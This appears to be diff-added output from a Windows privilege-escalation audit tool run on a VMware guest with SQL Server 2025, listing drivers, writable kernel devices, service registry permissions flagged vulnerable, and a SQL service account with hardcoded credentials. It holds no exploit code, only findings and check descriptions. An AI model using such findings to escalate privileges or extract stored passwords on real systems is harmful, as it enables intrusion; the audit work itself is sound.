+Name        : RsFx0800
+ImagePath   : system32\DRIVERS\RsFx0800.sys
+StartMode   : Disabled
+Type        : FileSystemDriver
+Status      : Stopped
+ProductName : Microsoft SQL Server
+Company     : Microsoft Corporation
+Description : RsFx Driver
+Version     : 2025.0170.0010.10 ((SQL).(DS_Main_Dev).(3b634a15253d5e3710090526c4274ef2f9199298).(76320dfe-a9b8-4c3c-aead-ae7e6cfa26cb).(892d7693c00001K).240807-0311)
+Copyright   : Microsoft. All rights reserved.
+
+Name        : SiSRaid2
+ImagePath   : System32\drivers\SiSRaid2.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Microsoft® Windows® Operating System
+Company     : Silicon Integrated Systems Corp.
+Description : SiS RAID Stor Miniport Driver
+Version     : 2.60.01 (NT.070926-1510)
+Copyright   : Copyright (c) SiS Corp. 2000-2010
+
+Name        : SiSRaid4
+ImagePath   : System32\drivers\sisraid4.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Microsoft® Windows® Operating System
+Company     : Silicon Integrated Systems
+Description : SiS AHCI Stor-Miniport Driver
+Version     : 3.60.03 (NT.070926-1510)
+Copyright   : Copyright (c) SiS Corp. 2007-2013
+
+Name        : SmartSAMD
+ImagePath   : System32\drivers\SmartSAMD.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : SmartRAID, SmartHBA PQI Storport Driver
+Company     : Microsemi Corportation
+Description : Storport Miniport Driver for SmartRAID/SmartHBA Controllers
+Version     : 1.50.1.0
+Copyright   : Copyright © 2015-2018 Microsemi Corporation. All rights reserved.
+
+Name        : stexstor
+ImagePath   : System32\drivers\stexstor.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Promise® SuperTrak EX Series
+Company     : Promise Technology, Inc.
+Description : Promise SuperTrak EX Series Driver for Windows x64
+Version     : 5.1.0000.10 (PART.121116-1330)
+Copyright   : © Promise Technology, Inc. All rights reserved.
+
+Name        : usb-platformdetection
+ImagePath   : \SystemRoot\System32\DriverStore\FileRepository\usb-platformdetection.inf_amd64_ba8192e24d655f0c\usb-platformdetection.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Unknown
+Company     : Unknown
+Description : Unknown
+Version     : Unknown
+Copyright   : Unknown
+
+Name        : vm3dmp
+ImagePath   : \SystemRoot\system32\DRIVERS\vm3dmp.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Running
+ProductName : VMware SVGA 3D
+Company     : VMware, Inc.
+Description : VMware SVGA 3D Miniport
+Version     : 9.17.07.0004
+Copyright   : Copyright © 1998-2024 Broadcom Inc. and/or its subsidiaries. All Rights Reserved.
+
+Name        : vm3dmp-debug
+ImagePath   : \SystemRoot\system32\DRIVERS\vm3dmp-debug.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : VMware SVGA 3D
+Company     : VMware, Inc.
+Description : VMware SVGA 3D Miniport
+Version     : 9.17.07.0004
+Copyright   : Copyright © 1998-2024 Broadcom Inc. and/or its subsidiaries. All Rights Reserved.
+
+Name        : vm3dmp-stats
+ImagePath   : \SystemRoot\system32\DRIVERS\vm3dmp-stats.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : VMware SVGA 3D
+Company     : VMware, Inc.
+Description : VMware SVGA 3D Miniport
+Version     : 9.17.07.0004
+Copyright   : Copyright © 1998-2024 Broadcom Inc. and/or its subsidiaries. All Rights Reserved.
+
+Name        : vm3dmp_loader
+ImagePath   : \SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Running
+ProductName : VMware SVGA 3D
+Company     : VMware, Inc.
+Description : VMware SVGA 3D Miniport Loader
+Version     : 9.17.07.0004
+Copyright   : Copyright © 1998-2024 Broadcom Inc. and/or its subsidiaries. All Rights Reserved.
+
+Name        : vmci
+ImagePath   : System32\drivers\vmci.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : VMware PCI VMCI Bus Device
+Company     : Broadcom Inc.
+Description : VMware PCI VMCI Bus Device
+Version     : 9.8.30.0
+Copyright   : Copyright © 1998-2025 Broadcom.
+
+Name        : vmhgfs
+ImagePath   : system32\DRIVERS\vmhgfs.sys
+StartMode   : Manual
+Type        : FileSystemDriver
+Status      : Stopped
+ProductName : VMware HGFS File System Driver
+Company     : VMware, Inc.
+Description : VMware HGFS File System Driver
+Version     : 11.0.44.0
+Copyright   : Copyright © 1998-2021 VMware, Inc.
+
+Name        : VMMemCtl
+ImagePath   : \SystemRoot\system32\DRIVERS\vmmemctl.sys
+StartMode   : Automatic
+Type        : KernelDriver
+Status      : Running
+ProductName : VMware server memory controller
+Company     : VMware, Inc.
+Description : VMware server memory controller
+Version     : 7.5.7.0
+Copyright   : Copyright © 1998-2021 VMware, Inc.
+
+Name        : vmmouse
+ImagePath   : \SystemRoot\System32\drivers\vmmouse.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Running
+ProductName : VMware Pointing PS/2 Device Driver
+Company     : VMware, Inc.
+Description : VMware Pointing PS/2 Device Driver
+Version     : 12.5.12.0
+Copyright   : Copyright © 1998-2021 VMware, Inc.
+
+Name        : vmrawdsk
+ImagePath   : \SystemRoot\system32\DRIVERS\vmrawdsk.sys
+StartMode   : System
+Type        : KernelDriver
+Status      : Running
+ProductName : VMware Raw Disk Helper Driver
+Company     : VMware, Inc.
+Description : VMware Raw Disk Helper Driver
+Version     : 1.1.7.0
+Copyright   : Copyright © 1998-2021 VMware, Inc.
+
+Name        : vmusbmouse
+ImagePath   : \SystemRoot\System32\drivers\vmusbmouse.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : VMware Pointing USB Device Driver
+Company     : VMware, Inc.
+Description : VMware Pointing USB Device Driver
+Version     : 12.5.12.0
+Copyright   : Copyright © 1998-2021 VMware, Inc.
+
+Name        : vmxnet3ndis6
+ImagePath   : \SystemRoot\System32\drivers\vmxnet3.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Running
+ProductName : VMware PCIe Ethernet Adapter NDIS 6.89 (64-bit)
+Company     : Broadcom Inc.
+Description : VMware PCIe Ethernet Adapter NDIS 6.89 (64-bit)
+Version     : 1.9.21.0
+Copyright   : Copyright © 1998-2026 Broadcom.
+
+Name        : vsmraid
+ImagePath   : System32\drivers\vsmraid.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : VIA RAID driver
+Company     : VIA Technologies Inc.,Ltd
+Description : VIA RAID DRIVER FOR AMD-X86-64
+Version     : 7.0.9600,6352
+Copyright   : Copyright (C) VIA Technologies 1992-2007
+
+Name        : vsock
+ImagePath   : system32\DRIVERS\vsock.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : VMware vSockets Service
+Company     : VMware, Inc.
+Description : VMware vSockets Service
+Version     : 9.8.19.0
+Copyright   : Copyright © 1998-2021 VMware, Inc.
+
+Name        : VSTXRAID
+ImagePath   : System32\drivers\vstxraid.sys
+StartMode   : Boot                                                                                                                                                                                                                          Type        : KernelDriver                                                                                                                                                                                                                  Status      : Running                                                                                                                                                                                                                       ProductName : VIA StorX RAID Controller Driver                                                                                                                                                                                              Company     : VIA Corporation                                                                                                                                                                                                               
+Description : VIA StorX RAID Controller Driver
+Version     : 8.0.9200.8110
+Copyright   : Copyright (C) 2008 VIA Corporation
+
+Name        : WinMad
+ImagePath   : \SystemRoot\System32\drivers\winmad.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : OpenFabrics Windows
+Company     : Mellanox
+Description : Kernel WinMad
+Version     : 5.50.14695
+Copyright   : Copyright© 2009 Mellanox Technologies Ltd
+
+Name        : WinVerbs
+ImagePath   : \SystemRoot\System32\drivers\winverbs.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : OpenFabrics Windows
+Company     : Mellanox
+Description : Kernel WinVerbs
+Version     : 5.50.14695
+Copyright   : Copyright© 2009 Mellanox Technologies Ltd
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:01.019
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Services - Known Vulnerable Drivers               ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether known vulnerable kernel drivers are installed. ┃
+┃ It does so by computing the file hash of each driver and     ┃
+┃ comparing the value against the list provided by             ┃
+┃ loldrivers.io.                                               ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:22.575
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Services - Known Vulnerable Driver Block List     ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether known vulnerable kernel drivers in the 'LOL    ┃
+┃ Drivers' database are blocked by a local Code Integrity      ┃
+┃ policy (driversipolicy.p7b or SiPolicy.p7b). Drivers that do ┃
+┃ not match any blocking rule are listed here.                 ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+WARNING: [GCIP] Failed to resolve policy file path (C:\WINDOWS\System32\CodeIntegrity\SiPolicy.p7b).
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:10.548
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Services - Named Kernel Device Permissions        ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about named Kernel devices for which         ┃
+┃ low-privileged users are granted write access. This can be   ┃
+┃ helpful as a first step to identify exploitable drivers.     ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+WARNING: NtOpenSymbolicLinkObject('\Device\BootDevice') - Access is denied (5)
+
+
+Name              : \Device\Afd
+ModifiablePath    : \\?\GLOBALROOT\Device\Afd
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\ahcache
+ModifiablePath    : \\?\GLOBALROOT\Device\ahcache
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\Bfs
+ModifiablePath    : \\?\GLOBALROOT\Device\Bfs
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\BitLocker
+ModifiablePath    : \\?\GLOBALROOT\Device\BitLocker
+IdentityReference : NT AUTHORITY\Authenticated Users (S-1-5-11)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericWrite
+
+Name              : \Device\CNG
+ModifiablePath    : \\?\GLOBALROOT\Device\CNG
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\DD9ADAAA-2585-41C5-9847-28A19BA9F344
+ModifiablePath    : \\?\GLOBALROOT\Device\DD9ADAAA-2585-41C5-9847-28A19BA9F344
+IdentityReference : NT AUTHORITY\Authenticated Users (S-1-5-11)
+Permissions       : AllAccess
+
+Name              : \Device\KeyboardClass0
+ModifiablePath    : \\?\GLOBALROOT\Device\KeyboardClass0
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\KsecDD
+ModifiablePath    : \\?\GLOBALROOT\Device\KsecDD
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\LanmanDatagramReceiver
+ModifiablePath    : \\?\GLOBALROOT\Device\LanmanDatagramReceiver
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\Netbios
+ModifiablePath    : \\?\GLOBALROOT\Device\Netbios
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\PEAuth
+ModifiablePath    : \\?\GLOBALROOT\Device\PEAuth
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : AllAccess
+
+Name              : \Device\PointerClass0
+ModifiablePath    : \\?\GLOBALROOT\Device\PointerClass0
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\RdpBus
+ModifiablePath    : \\?\GLOBALROOT\Device\RdpBus
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\Spaceport
+ModifiablePath    : \\?\GLOBALROOT\Device\Spaceport
+IdentityReference : Everyone (S-1-1-0)                                                                                                                                                                                                      Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite                                                                                                                                                                                                                                                                     Name              : \Device\Tdx                                                                                                                                                                                                             ModifiablePath    : \\?\GLOBALROOT\Device\Tdx                                                                                                                                                                                               
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\vmci
+ModifiablePath    : \\?\GLOBALROOT\Device\vmci
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericWrite
+
+Name              : \Device\VMCIHostDev
+ModifiablePath    : \\?\GLOBALROOT\Device\VMCIHostDev
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\vmmemctl
+ModifiablePath    : \\?\GLOBALROOT\Device\vmmemctl
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\WindowsTrustedRT
+ModifiablePath    : \\?\GLOBALROOT\Device\WindowsTrustedRT
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+Name              : \Device\WMIDataDevice
+ModifiablePath    : \\?\GLOBALROOT\Device\WMIDataDevice
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Execute, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericExecute, GenericWrite
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:02.043
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Services - Permissions                            ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ a service through the Service Control Manager (SCM).         ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:51.738
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Services - Registry Permissions                   ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ the settings of a service in the registry.                   ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:05.419
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃                                                                                                                                                                            ┃ NAME     ┃ Services - Registry Permissions (Extended)        ┃                                                                                                                                                                            ┃ TYPE     ┃ Extended                                          ┃                                                                                                                                                                            ┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫                                                                                                                                                                            ┃ Check whether the current user has any write permissions on  ┃                                                                                                                                                                            
+┃ the extended settings of a service in the registry. This may ┃
+┃ not necessarily result in a privilege escalation. Further    ┃
+┃ analysis is required.                                        ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Name              : embeddedmode
+StartMode         : Manual
+ImagePath         : C:\WINDOWS\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+User              : LocalSystem
+ModifiablePath    : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\embeddedmode\Parameters
+IdentityReference : NT AUTHORITY\Authenticated Users (S-1-5-11)
+Permissions       : QueryValue, CreateSubKey, EnumerateSubKeys, Notify, ReadControl, GenericRead
+Status            : Stopped
+UserCanStart      : True
+UserCanStop       : False
+
+Name              : vds
+StartMode         : Manual
+ImagePath         : C:\WINDOWS\System32\vds.exe
+User              : LocalSystem
+ModifiablePath    : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vds\Alignment
+IdentityReference : NT AUTHORITY\Authenticated Users (S-1-5-11)
+Permissions       : QueryValue, CreateSubKey, EnumerateSubKeys, ReadControl
+Status            : Stopped
+UserCanStart      : False
+UserCanStop       : False
+
+
+
+[*] STATUS  : VULNERABLE (Medium)
+[*] TIME    : 00:00:11.666
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Services - Image File Permissions                 ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ a service's binary or its folder.                            ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:32.776
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Services - Unquoted Paths                         ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether there are services configured with an          ┃
+┃ exploitable unquoted path that contains spaces.              ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.210
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Services - Service Control Manager Permissions    ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ the Service Control Manager (SCM).                           ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.041
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Services - Hardcoded Credentials                  ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether there are services configured with hardcoded   ┃
+┃ credentials, in which case the service account's password is ┃
+┃ likely to be stored in a reversible format in the registry,  ┃
+┃ and can be extracted with administrator privileges.          ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Name         : MSSQLSERVER
+DisplayName  : SQL Server (MSSQLSERVER)
+User         : .\svc_sql
+ImagePath    : "C:\Program Files\Microsoft SQL Server\MSSQL17.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER
+StartMode    : Automatic
+Type         : Win32OwnProcess
+RegistryKey  : HKLM\SYSTEM\CurrentControlSet\Services
+RegistryPath : HKLM\SYSTEM\CurrentControlSet\Services\MSSQLSERVER
+
+
+
+[*] STATUS  : VULNERABLE (Low)
+[*] TIME    : 00:00:00.217
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ Applications - Microsoft                          ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about Microsoft applications installed on    ┃
+┃ the machine by searching the registry and the default        ┃
+┃ install locations.                                           ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+Name                                                  Version            Path
+----                                                  -------            ----
+Browser for SQL Server 2025                           17.0.1000.7
+Internet Explorer                                     11.00.26100.8115   C:\Program Files\Internet Explorer
+Internet Explorer                                     11.00.26100.8328   C:\Program Files (x86)\Internet Explorer
+Microsoft Copilot (Copilot)                           156.0.4314.58      C:\Program Files (x86)\Microsoft
+Microsoft Edge                                        156.0.4314.58      C:\Program Files (x86)\Microsoft
+Microsoft EdgeWebView (Microsoft Edge WebView2 Run... 156.0.4314.58      C:\Program Files (x86)\Microsoft
+Microsoft ODBC Driver 17 for SQL Server               17.10.6.1
+Microsoft ODBC Driver 18 for SQL Server               18.5.2.1
+Microsoft OLE DB Driver 19 for SQL Server             19.3.7.0
+Microsoft OLE DB Driver for SQL Server                18.7.5.0
+Microsoft SQL Server                                  17.0.1000.7        C:\Program Files (x86)\Microsoft SQL Server
+Microsoft SQL Server 2025 RsFx Driver                 17.0.1000.7
+Microsoft SQL Server 2025 Setup (English)             17.0.1000.7
+Microsoft SQL Server SQL2025 (Microsoft SQL Server...                    C:\Program Files\Microsoft SQL Server
+Microsoft Visual C++ 2015-2022 Redistributable (x6... 14.42.34438.0
+Microsoft Visual C++ 2015-2022 Redistributable (x8... 14.42.34438.0
+Microsoft Visual C++ 2022 X64 Additional Runtime -... 14.42.34438
+Microsoft Visual C++ 2022 X64 Minimum Runtime - 14... 14.42.34438
+Microsoft Visual C++ 2022 X86 Additional Runtime -... 14.42.34438
+Microsoft Visual C++ 2022 X86 Minimum Runtime - 14... 14.42.34438
+Microsoft VSS Writer for SQL Server 2025              17.0.1000.7
+Microsoft.NET (Microsoft Analysis Services)           19.84.1.0          C:\Program Files\Microsoft.NET
+SQL Server 2025 Batch Parser                          17.0.1000.7
+SQL Server 2025 Connection Info                       17.0.1000.7
+SQL Server 2025 Database Engine Services              17.0.1000.7
+SQL Server 2025 Database Engine Shared                17.0.1000.7
+SQL Server 2025 DMF                                   17.0.1000.7
+SQL Server 2025 Shared Management Objects             17.0.1000.7
+SQL Server 2025 Shared Management Objects Extensio... 17.0.1000.7                                                                                                                                                                           SQL Server 2025 SQL Diagnostics                       17.0.1000.7                                                                                                                                                                           SQL Server 2025 XEvent                                17.0.1000.7                                                                                                                                                                           Windows Defender (Microsoft® Windows® Operating Sy... 4.18.1907.16384    C:\Program Files\Windows Defender                                                                                                                                  Windows Defender (Microsoft® Windows® Operating Sy... 4.18.25080.5       C:\Program Files (x86)\Windows Defender                                                                                                                            
+Windows Defender Advanced Threat Protection (Windo... 10.8837.26060.2029 C:\Program Files\Windows Defender Advanced Threat Protection
+Windows Mail (Microsoft® Windows® Operating System... 10.0.26100.8115    C:\Program Files\Windows Mail
+Windows Mail (Microsoft® Windows® Operating System... 10.0.26100.8328    C:\Program Files (x86)\Windows Mail
+Windows Media Player (Microsoft® Windows® Operatin... 12.0.26100.1       C:\Program Files (x86)\Windows Media Player
+Windows Media Player (Microsoft® Windows® Operatin... 12.0.26100.9549    C:\Program Files\Windows Media Player
+Windows Photo Viewer (Microsoft® Windows® Operatin... 10.0.26100.1       C:\Program Files\Windows Photo Viewer
+
+
+[*] STATUS  : INFO                                                                                                                                                                                                                          [*] TIME    : 00:00:00.696                                                                                                                                                                                                                  [*] SUMMARY : No summary available yet.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ Applications - Third-Party                        ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about third-party applications installed on  ┃
+┃ the machine by searching the registry and the default        ┃
+┃ install locations.                                           ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
